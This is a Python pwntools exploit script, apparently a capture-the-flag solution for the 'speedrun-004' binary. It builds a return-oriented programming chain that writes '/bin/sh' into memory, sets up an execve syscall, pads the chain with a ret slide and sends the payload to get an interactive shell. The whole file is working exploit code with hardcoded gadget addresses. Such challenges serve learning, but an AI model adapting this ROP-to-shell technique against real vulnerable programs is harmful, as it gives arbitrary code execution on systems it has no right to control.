#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-02-26 07:59:59
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *

context.arch = "amd64"

def exploit():
    filename = "./speedrun-004"
    target_binary = ELF(filename)
    my_rop = ROP(target_binary)

    # address to write shell string
    bss = 0x6b6030
    write_gadget = 0x48d301         # mov qword ptr [rax], rdx;
    syscall_number = 0x3b           # execve       
    syscall = 0x40132c              # execve address
    shell_string = "/bin/sh\x00"
    ret = 0x400416                  # for ret slide
    overwrite_byte = b"\x00"

    # ROP chain building
    # pop rdx, shell_string;
    # pop rax, bss_address;
    # mov qword ptr [rax], rdx;
    my_rop(rdx=shell_string, rax=bss)
    my_rop.raw(write_gadget)

    # pop rax, syscall_number;
    # pop rdi, bss_address;
    # pop rsi, 0;
    # pop rdx, 0;
    # syscall;
    my_rop(rax=syscall_number, rdi=bss)
    my_rop(rsi=0)
    my_rop(rdx=0)
    my_rop.raw(syscall)
    print(my_rop.dump())
    chain = my_rop.chain()
    log.info(f"using chain:\n {chain}")
    log.info(f"chain length: {len(chain)}")
    log.info("Creating ret slide...")
    # create a ret slide as cushion
    ret_slide_size = (256 - len(chain)) // 8
    log.info(f"ret slide size: {ret_slide_size}")
    ret_slide_rop = ROP(target_binary)
    for i in range(ret_slide_size):
        ret_slide_rop.raw(ret)
    ret_slide = ret_slide_rop.chain()
    log.info(f"ret slide: \n{ret_slide}")
    
    payload = ret_slide + chain + overwrite_byte
    log.info(f"payload length: {len(payload)}")
    log.info(f"payload:\n {payload}")
    
    target_process = process(filename)

    # Debugging
    # gdbscript = """
    # b *0x400baf
    # b *0x400c44
    # b *0x400bd1
    # b *0x44a155
    # b *0x415f04
    # b *0x44c6d9
    # b *0x415f04
    # b *0x400686
    # b *0x40132c
    # """
    # gdb.attach(target_process, gdbscript=gdbscript)

    target_process.send(b'257')
    input("Press Enter to continue...")
    target_process.send(payload)
    target_process.interactive()

if __name__ == "__main__":
    exploit()

